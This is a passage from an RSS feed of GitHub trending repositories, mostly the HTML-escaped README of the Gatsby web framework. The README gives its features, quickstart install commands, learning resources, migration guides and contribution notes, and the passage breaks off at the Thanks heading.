&lt;p&gt;&lt;a href="http://www.xuntayizhan.com/person/ji-ke-ai-qing-zhi-er-shi-dai-wo-dai-ma-bian-cheng-qu-ni-wei-qi-ke-hao-wan/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/3dd14d6f6feb6978f3e88cfb667d902f3c0cb65e/687474703a2f2f6272616e642e70686f64616c2e636f6d2f736c6f67616e2f736c6f67616e2e737667" alt="待我代码编成,娶你为妻可好" data-canonical-src="http://brand.phodal.com/slogan/slogan.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>phodal</author><guid isPermaLink="false">https://github.com/phodal/migration</guid><pubDate>Sun, 19 Jan 2020 00:22:00 GMT</pubDate></item><item><title>gatsbyjs/gatsby #23 in All Languages, Today</title><link>https://github.com/gatsbyjs/gatsby</link><description>&lt;p&gt;&lt;i&gt;Build blazing fast, modern apps and websites with React&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p align="center"&gt;
  &lt;a href="https://gatsbyjs.org" rel="nofollow"&gt;
    &lt;img alt="Gatsby" src="https://camo.githubusercontent.com/ac31ac54c2013850b0fb8a3a4926f4718a398fb3/68747470733a2f2f7777772e6761747362796a732e6f72672f6d6f6e6f6772616d2e737667" width="60" data-canonical-src="https://www.gatsbyjs.org/monogram.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
&lt;/p&gt;
&lt;h1 align="center"&gt;&lt;a id="user-content---gatsby-v2" class="anchor" aria-hidden="true" href="#--gatsby-v2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;
  Gatsby v2
&lt;/h1&gt;
&lt;h3 align="center"&gt;&lt;a id="user-content---️--" class="anchor" aria-hidden="true" href="#--️--"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;
  &lt;g-emoji class="g-emoji" alias="atom_symbol" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/269b.png"&gt;⚛️&lt;/g-emoji&gt; &lt;g-emoji class="g-emoji" alias="page_facing_up" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c4.png"&gt;📄&lt;/g-emoji&gt; &lt;g-emoji class="g-emoji" alias="rocket" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png"&gt;🚀&lt;/g-emoji&gt;
&lt;/h3&gt;
&lt;h3 align="center"&gt;&lt;a id="user-content---fast-in-every-way-that-matters" class="anchor" aria-hidden="true" href="#--fast-in-every-way-that-matters"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;
  Fast in every way that matters
&lt;/h3&gt;
&lt;p align="center"&gt;
  Gatsby is a free and open source framework based on React that helps developers build blazing fast websites and apps
&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;a href="https://github.com/gatsbyjs/gatsby/blob/master/LICENSE"&gt;
    &lt;img src="https://camo.githubusercontent.com/890acbdcb87868b382af9a4b1fac507b9659d9bf/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4d49542d626c75652e737667" alt="Gatsby is released under the MIT license." data-canonical-src="https://img.shields.io/badge/license-MIT-blue.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://circleci.com/gh/gatsbyjs/gatsby" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/78593dcef20738615e980a96fe679cef8e504aed/68747470733a2f2f636972636c6563692e636f6d2f67682f6761747362796a732f6761747362792e7376673f7374796c653d736869656c64" alt="Current CircleCI build status." data-canonical-src="https://circleci.com/gh/gatsbyjs/gatsby.svg?style=shield" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.npmjs.org/package/gatsby" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/9ab0c6792e3b2aac6ad6e4ce0fb222b0c2e3473b/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6761747362792e737667" alt="Current npm package version." data-canonical-src="https://img.shields.io/npm/v/gatsby.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://npmcharts.com/compare/gatsby?minimal=true" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/cbfd237fcf99db166f4e874c698d5fc2885e99e5/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f646d2f6761747362792e737667" alt="Downloads per month on npm." data-canonical-src="https://img.shields.io/npm/dm/gatsby.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://npmcharts.com/compare/gatsby?minimal=true" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/d51d778f6a7096eba428f90b8e8563eef0d6bce2/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f64742f6761747362792e737667" alt="Total downloads on npm." data-canonical-src="https://img.shields.io/npm/dt/gatsby.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://gatsbyjs.org/contributing/how-to-contribute/" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/d4e0f63e9613ee474a7dfdc23c240b9795712c96/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5052732d77656c636f6d652d627269676874677265656e2e737667" alt="PRs welcome!" data-canonical-src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://twitter.com/intent/follow?screen_name=gatsbyjs" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/22cb878ea8dbe14ff83aedc96b563ba2d7a72b29/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6761747362796a732e7376673f6c6162656c3d466f6c6c6f77253230406761747362796a73" alt="Follow @gatsbyjs" data-canonical-src="https://img.shields.io/twitter/follow/gatsbyjs.svg?label=Follow%20@gatsbyjs" style="max-width:100%;"&gt;
  &lt;/a&gt;
&lt;/p&gt;
&lt;h3 align="center"&gt;&lt;a id="user-content---quickstart------tutorial------plugins------starters------showcase------contribute------support-spectrum------discord" class="anchor" aria-hidden="true" href="#--quickstart------tutorial------plugins------starters------showcase------contribute------support-spectrum------discord"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;
  &lt;a href="https://gatsbyjs.org/docs/" rel="nofollow"&gt;Quickstart&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  &lt;a href="https://gatsbyjs.org/tutorial/" rel="nofollow"&gt;Tutorial&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  &lt;a href="https://gatsbyjs.org/plugins/" rel="nofollow"&gt;Plugins&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  &lt;a href="https://gatsbyjs.org/starters/" rel="nofollow"&gt;Starters&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  &lt;a href="https://gatsbyjs.org/showcase/" rel="nofollow"&gt;Showcase&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  &lt;a href="https://gatsbyjs.org/contributing/how-to-contribute/" rel="nofollow"&gt;Contribute&lt;/a&gt;
  &lt;span&gt; · &lt;/span&gt;
  Support: &lt;a href="https://spectrum.chat/gatsby-js" rel="nofollow"&gt;Spectrum&lt;/a&gt;
  &lt;span&gt; &amp;amp; &lt;/span&gt;
  &lt;a href="https://gatsby.dev/discord" rel="nofollow"&gt;Discord&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Gatsby is a modern web framework for blazing fast websites.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Go Beyond Static Websites.&lt;/strong&gt; Get all the benefits of static websites with none of the
limitations. Gatsby sites are fully functional React apps so you can create high-quality,
dynamic web apps, from blogs to e-commerce sites to user dashboards.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use a Modern Stack for Every Site.&lt;/strong&gt; No matter where the data comes from, Gatsby sites are
built using React and GraphQL. Build a uniform workflow for you and your team, regardless of
whether the data is coming from the same backend.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Load Data From Anywhere.&lt;/strong&gt; Gatsby pulls in data from any data source, whether it’s Markdown
files, a headless CMS like Contentful or WordPress, or a REST or GraphQL API. Use source plugins
to load your data, then develop using Gatsby’s uniform GraphQL interface.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Performance Is Baked In.&lt;/strong&gt; Ace your performance audits by default. Gatsby automates code
splitting, image optimization, inlining critical styles, lazy-loading, and prefetching resources,
and more to ensure your site is fast — no manual tuning required.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Host at Scale for Pennies.&lt;/strong&gt; Gatsby sites don’t require servers so you can host your entire
site on a CDN for a fraction of the cost of a server-rendered site. Many Gatsby sites can be
hosted entirely free on services like GitHub Pages and Netlify.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://gatsbyjs.org/docs/" rel="nofollow"&gt;&lt;strong&gt;Learn how to use Gatsby for your next project.&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-whats-in-this-document" class="anchor" aria-hidden="true" href="#whats-in-this-document"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;What’s In This Document&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-get-up-and-running-in-5-minutes"&gt;Get Up and Running in 5 Minutes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-learning-gatsby"&gt;Learning Gatsby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-migration-guides"&gt;Migration Guides&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-how-to-contribute"&gt;How to Contribute&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#memo-license"&gt;License&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-thanks"&gt;Thanks to Our Contributors and Sponsors&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content--get-up-and-running-in-5-minutes" class="anchor" aria-hidden="true" href="#-get-up-and-running-in-5-minutes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="rocket" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png"&gt;🚀&lt;/g-emoji&gt; Get Up and Running in 5 Minutes&lt;/h2&gt;
&lt;p&gt;You can get a new Gatsby site up and running on your local dev environment in 5 minutes with these four steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Install the Gatsby CLI.&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;npm install -g gatsby-cli
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a Gatsby site from a Gatsby starter.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Get your Gatsby blog set up in a single command:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; create a new Gatsby site using the default starter&lt;/span&gt;
gatsby new my-blazing-fast-site&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Start the site in &lt;code&gt;develop&lt;/code&gt; mode.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Next, move into your new site’s directory and start it up:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;cd&lt;/span&gt; my-blazing-fast-site/
gatsby develop&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Open the source code and start editing!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Your site is now running at &lt;code&gt;http://localhost:8000&lt;/code&gt;. Open the &lt;code&gt;my-blazing-fast-site&lt;/code&gt; directory in your code editor of choice and edit &lt;code&gt;src/pages/index.js&lt;/code&gt;. Save your changes, and the browser will update in real time!&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;At this point, you’ve got a fully functional Gatsby website. For additional information on how you can customize your Gatsby site, see our &lt;a href="https://gatsbyjs.org/plugins/" rel="nofollow"&gt;plugins&lt;/a&gt; and &lt;a href="https://gatsbyjs.org/tutorial/" rel="nofollow"&gt;the official tutorial&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content--learning-gatsby" class="anchor" aria-hidden="true" href="#-learning-gatsby"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="mortar_board" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f393.png"&gt;🎓&lt;/g-emoji&gt; Learning Gatsby&lt;/h2&gt;
&lt;p&gt;Full documentation for Gatsby lives &lt;a href="https://gatsbyjs.org/" rel="nofollow"&gt;on the website&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;For most developers, we recommend starting with our &lt;a href="https://gatsbyjs.org/tutorial/" rel="nofollow"&gt;in-depth tutorial for creating a site with Gatsby&lt;/a&gt;.&lt;/strong&gt; It starts with zero assumptions about your level of ability and walks through every step of the process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;To dive straight into code samples head &lt;a href="https://gatsbyjs.org/docs/" rel="nofollow"&gt;to our documentation&lt;/a&gt;.&lt;/strong&gt; In particular, check out the “&lt;i&gt;Guides&lt;/i&gt;”, “&lt;i&gt;API Reference&lt;/i&gt;”, and “&lt;i&gt;Advanced Tutorials&lt;/i&gt;” sections in the sidebar.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We welcome suggestions for improving our docs. See the &lt;a href="https://gatsbyjs.org/contributing/how-to-contribute/" rel="nofollow"&gt;“how to contribute”&lt;/a&gt; documentation for more details.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Start Learning Gatsby: &lt;a href="https://gatsbyjs.org/tutorial/" rel="nofollow"&gt;Follow the Tutorial&lt;/a&gt; · &lt;a href="https://gatsbyjs.org/docs/" rel="nofollow"&gt;Read the Docs&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content--migration-guides" class="anchor" aria-hidden="true" href="#-migration-guides"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="briefcase" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4bc.png"&gt;💼&lt;/g-emoji&gt; Migration Guides&lt;/h2&gt;
&lt;p&gt;Already have a Gatsby site? These handy guides will help you add the improvements of Gatsby v2 to your site without starting from scratch!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gatsbyjs.org/docs/migrating-from-v1-to-v2/" rel="nofollow"&gt;Migrate a Gatsby site from v1 to v2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Still on v0? Start here: &lt;a href="https://gatsbyjs.org/docs/migrating-from-v0-to-v1/" rel="nofollow"&gt;Migrate a Gatsby site from v0 to v1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content--code-of-conduct" class="anchor" aria-hidden="true" href="#-code-of-conduct"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;❗ Code of Conduct&lt;/h2&gt;
&lt;p&gt;Gatsby is dedicated to building a welcoming, diverse, safe community. We expect everyone participating in the Gatsby community to abide by our &lt;a href="https://gatsbyjs.org/contributing/code-of-conduct/" rel="nofollow"&gt;&lt;strong&gt;Code of Conduct&lt;/strong&gt;&lt;/a&gt;. Please read it. Please follow it. In the Gatsby community, we work hard to build each other up and create amazing things together. &lt;g-emoji class="g-emoji" alias="muscle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4aa.png"&gt;💪&lt;/g-emoji&gt;&lt;g-emoji class="g-emoji" alias="purple_heart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49c.png"&gt;💜&lt;/g-emoji&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content--how-to-contribute" class="anchor" aria-hidden="true" href="#-how-to-contribute"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="handshake" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f91d.png"&gt;🤝&lt;/g-emoji&gt; How to Contribute&lt;/h2&gt;
&lt;p&gt;Whether you're helping us fix bugs, improve the docs, or spread the word, we'd love to have you as part of the Gatsby community! &lt;g-emoji class="g-emoji" alias="muscle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4aa.png"&gt;💪&lt;/g-emoji&gt;&lt;g-emoji class="g-emoji" alias="purple_heart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49c.png"&gt;💜&lt;/g-emoji&gt;&lt;/p&gt;
&lt;p&gt;Check out our &lt;a href="https://gatsbyjs.org/contributing/how-to-contribute/" rel="nofollow"&gt;&lt;strong&gt;Contributing Guide&lt;/strong&gt;&lt;/a&gt; for ideas on contributing and setup steps for getting our repositories up and running on your local machine.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-a-note-on-how-this-repository-is-organized" class="anchor" aria-hidden="true" href="#a-note-on-how-this-repository-is-organized"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;A note on how this repository is organized&lt;/h3&gt;
&lt;p&gt;This repository is a &lt;a href="https://trunkbaseddevelopment.com/monorepos/" rel="nofollow"&gt;monorepo&lt;/a&gt; managed using &lt;a href="https://github.com/lerna/lerna"&gt;Lerna&lt;/a&gt;. This means there are &lt;a href="/packages"&gt;multiple packages&lt;/a&gt; managed in this codebase, even though we publish them to NPM as separate packages.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-contributing-to-gatsby-v1" class="anchor" aria-hidden="true" href="#contributing-to-gatsby-v1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing to Gatsby v1&lt;/h3&gt;
&lt;p&gt;We are currently only accepting bug fixes for Gatsby v1. No new features will be accepted.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-memo-license" class="anchor" aria-hidden="true" href="#memo-license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="memo" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4dd.png"&gt;📝&lt;/g-emoji&gt; License&lt;/h2&gt;
&lt;p&gt;Licensed under the &lt;a href="./LICENSE"&gt;MIT License&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content--thanks" class="anchor" aria-hidden="true" href="#-thanks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="purple_heart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49c.png"&gt;💜&lt;/g-emoji&gt; Thanks&lt;/h2&gt;
